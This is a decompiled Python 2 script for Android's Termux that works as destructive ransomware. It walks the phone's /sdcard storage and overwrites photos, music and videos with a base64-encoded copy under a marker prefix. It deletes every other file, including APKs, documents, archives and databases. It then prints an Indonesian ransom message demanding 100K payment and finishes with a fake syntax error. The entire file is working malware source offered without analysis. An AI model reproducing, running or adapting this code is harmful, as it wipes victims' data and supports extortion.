# Decompiled By xNot_Found
# Github : https://github.com/hatakecnk
# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:05:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
from zipfile import ZipFile
from base64 import b64encode
from base64 import b64decode
import os, datetime, sys, time
from shutil import copyfile
os.system('termux-setup-storage')

def pes(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.06)


def pesl(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.1)


def get_all_file_paths(directory):
    file_paths = []
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            filepathr = filepath.replace('.', ' ')
            fileas = filepathr.split()[(-1)]
            fileask = fileas.lower()
            foto = ['jpg', 'jpeg', 'png', 'gif']
            video = ['mp4', '3gp', 'mpv']
            musik = ['mp3', 'wav', 'ogg']
            sc = ['txt', 'py', 'pyc', 'sh', 'php', 'zip', '7z', 'tar', 'gz', 'pkg', 'java', 'lua', 'rar', 'pdf', 'html', 'htm', 'css', 'js', 'xhtml', 'sys', 'doc', 'webp', 'crypt1', 'crypt12', 'opus', 'enc', 'db', 'dat', 'usr', 'tps', 'xth', 'xml', 'aes', 'doc', 'json', 'arsc', 'cfg', 'ttf', 'obj', 'obb', 'bak', 'tmp']
            if fileask in foto:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.jpg'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                gell = 'QEdFTExNb3hlci5FbmMoc3VwZXIpVnkyYlVUZFh3M21OdnFMa3gwbWd5'
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask in musik:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.mp3'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                gell = 'QEdFTExNb3hlci5FbmMoc3VwZXIpVnkyYlVUZFh3M21OdnFMa3gwbWd5'
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask in video:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.mp4'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                gell = 'QEdFTExNb3hlci5FbmMoc3VwZXIpVnkyYlVUZFh3M21OdnFMa3gwbWd5'
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask == 'apk':
                filesp = filepathr.split()[0]
                filespa = filesp + '.apk'
                os.rename(filepath, filespa)
                os.remove(filespa)
            elif fileask in sc:
                filesp = filepathr.split()[0]
                filespa = filesp + '.sc'
                os.rename(filepath, filespa)
                os.remove(filespa)
            else:
                filesp = filepathr.split()[0]
                filespa = filesp + '.OndeOnde'
                os.rename(filepath, filespa)
                os.remove(filespa)

    return file_paths


def main():
    directory = './python_files'
    file_paths = get_all_file_paths('/sdcard')
    print '\n\n\x1b[1;96m            MOHON DI BACA:\n' + 40 * '-'
    pes('\n       \x1b[1;91mJANGAN DI SKIP! PENTING!!')
    pes(' \x1b[1;92mSEMUA File Anda Sudah \x1b[1;96mTerEncrypt \xf0\x9f\x94\x90\n \x1b[1;92mTapi Bisa Kembali ASAL, \n \x1b[1;96mBISA MENJAWAB')
    pes('\x1b[1;92m Pertanyaan Ini..\xf0\x9f\x93\x8b\n')
    pesl('\x1b[1;93m 1. Siapa \x1b[1;92mTuhanmu?\n \x1b[1;93m2. Siapa\x1b[1;92m Nabimu?\n\x1b[1;93m 3. Apa \x1b[1;92mAgamamu? \n\x1b[1;93m 4. Siapa \x1b[1;92mImammu?\n \x1b[1;93m5. Dimana \x1b[1;92mKiblatmu? \n\x1b[1;93m 6. Siapa \x1b[1;92mSaudaramu?\n\n')
    pesl('  \x1b[1;91mBERHENTILAH MENCURI:\n  \x1b[1;96m\xe2\x9d\x9d Dan peliharalah dirimu dari (azab yang terjadi pada)\n    hari yang pada waktu itu kamu semua dikembalikan\n    kepada Allah. (QS. Al Baqarah: 281)\xe2\x9d\x9e\n')
    pes(' \x1b[1;97m_> \x1b[1;91mNOTE:\x1b[1;92m SELAIN FILE FOTO, MUSIC DAN VIDEO, \x1b[1;91m SUDAH TERHAPUS!!\n          \x1b[1;92mDAN JANGAN BUKA \x1b[1;96mSC\x1b[1;92m INI 2 KALI.!! AGAR FILE ANDA AMAN. ')
    pes('\n\n \x1b[1;94m Sekarang Coba Buka \x1b[1;97m(\x1b[1;91mMEMORY TELEPHON\x1b[1;97m)\x1b[1;92m ANDA.!!\n Masih Ada dan Tidak \x1b[1;96m Terhapus,\x1b[1;92m Hanya Tidak Bisa\n Dilihat ataupun di Buka.')
    pesl('\x1b[1;93m Untuk Kolom Pertanyaannya \x1b[1;92mBAYAR \x1b[1;96m100K\x1b[1;92m \xf0\x9f\x91\xbb\n File foto, Music dan Video Bakal Balik lagi !!\n\n         \x1b[1;96m \xe2\x9d\x8cDONT CRY \xf0\x9f\x98\x9b')
    time.sleep(1)
    print '\n\x1b[1;97msyntax error:\n.           exit program >\n'


if __name__ == '__main__':
    os.system('clear')
    main()